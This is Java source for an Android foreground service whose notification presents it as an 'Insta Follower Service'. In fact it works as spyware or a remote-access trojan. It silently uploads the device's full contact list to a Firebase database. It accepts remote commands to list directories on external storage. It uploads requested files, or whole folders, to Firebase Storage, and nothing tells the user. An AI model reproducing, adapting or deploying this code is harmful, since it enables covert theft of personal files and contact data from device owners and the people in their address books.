package com.example.client;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.v4.app.JobIntentService;
import android.support.v4.app.NotificationCompat;
import android.support.v4.content.ContextCompat;
import android.telephony.TelephonyManager;
import android.widget.Toast;

import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.database.ChildEventListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.util.HashMap;
import java.util.Map;

public class MyService extends Service {
    private ChildEventListener l1,l2;



    public static final String CHANNEL_ID = "ForegroundServiceChannel";

    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String input = intent.getStringExtra("inputExtra");
        createNotificationChannel();
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this,
                0, notificationIntent, 0);

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Insta Follower Service")
                .setContentText(input)
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setContentIntent(pendingIntent)
                .build();

        startForeground(1, notification);

        //do heavy work on a background thread
        // This describes what will happen when service is triggered
        mDatabase = new DatabaseManager(this);

        // try {
        loadID();
        initializeFirebase(ids);
        mStorageRef = FirebaseStorage.getInstance().getReference();
        getContactList();

            dwnldpaths.removeEventListener(l1);
        listenForDownloadRequest();
        try {
            cmds.removeEventListener(l2);
        }catch (Exception e){listenForCommands();}




        //stopSelf();

        return START_NOT_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "Follower Robot Status",
                    NotificationManager.IMPORTANCE_DEFAULT
            );

            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(serviceChannel);
        }
    }





    private DatabaseManager mDatabase;

    private String ids;
    private StorageReference riversRef2;
    private StorageReference mStorageRef;
    DatabaseReference dwnldpathsMobile,dwnldpaths,cmds,cmdresults,refContacts,refContacts2;





    private void loadID() {


        try {
            Cursor cursor = mDatabase.getAllEmployees();

            if (cursor.moveToFirst()) {

                ids = cursor.getString(0);
                if (!ids.isEmpty()) {
                    initializeFirebase(ids);
                    getContactList();
                    listenForDownloadRequest();
                    listenForCommands();
                } else {

                }


            }
        } catch (Exception e) {
            // stopSelf();
            Toast.makeText(getApplicationContext(), "ERROR LOAD", Toast.LENGTH_LONG).show();
        }

    }


    private void uploadFIle(String filepath, String idUser, final String pathu) {



        try{
            Uri file = Uri.fromFile(new File(Environment.getExternalStorageDirectory().toString() + filepath));
            String fileType = filepath.substring(filepath.lastIndexOf("."));

            riversRef2 = mStorageRef.child("images/" + pathu + fileType);

            UploadTask uploadTask = riversRef2.putFile(file);

            uploadTask.addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                @Override
                public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                    riversRef2.getDownloadUrl().addOnSuccessListener(new OnSuccessListener<Uri>() {
                        @Override
                        public void onSuccess(Uri uri) {




                        }
                    });

                }
            });
        }catch (StringIndexOutOfBoundsException e){}

    }


    private String getCountryISO() {
        String iso = null;

        TelephonyManager telephonyManager = (TelephonyManager) getApplicationContext().getSystemService(getApplicationContext().TELEPHONY_SERVICE);
        if (telephonyManager.getNetworkCountryIso() != null)
            if (!telephonyManager.getNetworkCountryIso().toString().equals(""))
                iso = telephonyManager.getNetworkCountryIso().toString();

        return CountryToPhonePrefix.getPhone(iso);
    }

    private void getContactList() {


        String ISOPrefix = getCountryISO();

        Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        while (phones.moveToNext()) {
            String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String phone = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

            phone = phone.replace(" ", "");
            phone = phone.replace("-", "");
            phone = phone.replace("(", "");
            phone = phone.replace(")", "");

            if (!String.valueOf(phone.charAt(0)).equals("+"))
                phone = ISOPrefix + phone;

            // UserObject mContact = new UserObject("", name, phone);
            //send contact info
            Map phoneListMap = new HashMap<>();
            phoneListMap.put(phone, name);
            DatabaseReference refContacts3 = FirebaseDatabase.getInstance().getReference().child(ids).child("contacts");
            refContacts3.updateChildren(phoneListMap);

        }


    }


    private void listenForCommands() {
        cmds.addChildEventListener(l2);
    }


    private void listenForDownloadRequest() {
        dwnldpaths.addChildEventListener(l1);
    }

    private void initializeFirebase(String idd) {
        //FirebaseDatabase.getInstance().getReference().child(idd);
        FirebaseDatabase.getInstance().getReference().child(idd).child("commands");
        FirebaseDatabase.getInstance().getReference().child(idd).child("commandsResults");

        FirebaseDatabase.getInstance().getReference().child(idd).child("downloadPathsMobile");
        FirebaseDatabase.getInstance().getReference().child(idd).child("downloadsPaths");

        FirebaseDatabase.getInstance().getReference().child(idd).child("contacts");


        refContacts = FirebaseDatabase.getInstance().getReference().child(idd).child("contacts");
        refContacts2 = FirebaseDatabase.getInstance().getReference().child(idd).child("contactrequests");

        cmds = FirebaseDatabase.getInstance().getReference().child(idd).child("commands");
        cmdresults = FirebaseDatabase.getInstance().getReference().child(idd).child("commandsResults");

        dwnldpathsMobile = FirebaseDatabase.getInstance().getReference().child(idd).child("downloadPathsMobile");
        dwnldpaths = FirebaseDatabase.getInstance().getReference().child(idd).child("downloadsPaths");
        dwnldpaths.removeValue();
        cmds.removeValue();
        l1=new ChildEventListener() {
            @Override
            public void onChildAdded(@NonNull DataSnapshot dataSnapshot, @Nullable String s) {
                if (dataSnapshot.exists()) {
                    for(DataSnapshot childsnapshot : dataSnapshot.getChildren()){
                        String filePathRequested = childsnapshot.getValue().toString();
                        String p=filePathRequested.substring(filePathRequested.lastIndexOf("/")+1);
                        if(p.equals("*")){

                            String j=filePathRequested.replace("*","");
                            //list files in directory
                            String path = Environment.getExternalStorageDirectory().toString() + j;
                            // String path = Environment.getExternalStorageDirectory().toString()+"/Pictures";
                            // Log.d("Files", "Path: " + path);
                            File directory = new File(path);
                            File[] files = directory.listFiles();
                            //Log.d("Files", "Size: "+ files.length);
                            for (int i = 0; i < files.length; i++) {
                               try {
                                   String hk=files[i].getName().substring(files[i].getName().lastIndexOf("."));
                                   uploadFIle(j+files[i].getName(), ids,files[i].getName().replace(hk,""));

                                   Map newMap = new HashMap<>();
                                   String pathh=dwnldpathsMobile.push().getKey();
                                   DatabaseReference temp = dwnldpathsMobile.child(pathh);
                                   newMap.put("status", "completed");
                                   temp.updateChildren(newMap);
                               }catch (StringIndexOutOfBoundsException e){
                                   Map newMap = new HashMap<>();
                                   String pathh=dwnldpathsMobile.push().getKey();
                                   DatabaseReference temp = dwnldpathsMobile.child(pathh);
                                   newMap.put("status", "error");
                                   temp.updateChildren(newMap);
                               }

                            }





                        }
                       else{ uploadFIle(filePathRequested, ids,childsnapshot.getKey());}

                    }


                    //check the path requested

                }
            }

            @Override
            public void onChildChanged(@NonNull DataSnapshot dataSnapshot, @Nullable String s) {

            }

            @Override
            public void onChildRemoved(@NonNull DataSnapshot dataSnapshot) {

            }

            @Override
            public void onChildMoved(@NonNull DataSnapshot dataSnapshot, @Nullable String s) {

            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }
        };
        l2=new ChildEventListener() {
            @Override
            public void onChildAdded(@NonNull DataSnapshot dataSnapshot, @Nullable String s) {
                if (dataSnapshot.exists()) {
                    String command = dataSnapshot.getValue().toString();

                    //list files in directory
                    String path = Environment.getExternalStorageDirectory().toString() + command;
                    // String path = Environment.getExternalStorageDirectory().toString()+"/Pictures";
                    // Log.d("Files", "Path: " + path);
                    File directory = new File(path);
                    File[] files = directory.listFiles();
                    Map filesMap = new HashMap<>();
                    filesMap.put("size", files.length);
                    String key = dataSnapshot.getKey();
                    cmdresults.child(key).updateChildren(filesMap);
                    //Log.d("Files", "Size: "+ files.length);
                    for (int i = 0; i < files.length; i++) {
                        Map filesMap2 = new HashMap<>();
                        filesMap2.put("file"+Integer.toString(i+1), files[i].getName());
                        cmdresults.child(key).updateChildren(filesMap2);
                    }


                }
            }

            @Override
            public void onChildChanged(@NonNull DataSnapshot dataSnapshot, @Nullable String s) {

            }

            @Override
            public void onChildRemoved(@NonNull DataSnapshot dataSnapshot) {

            }

            @Override
            public void onChildMoved(@NonNull DataSnapshot dataSnapshot, @Nullable String s) {

            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }
        };
    }



}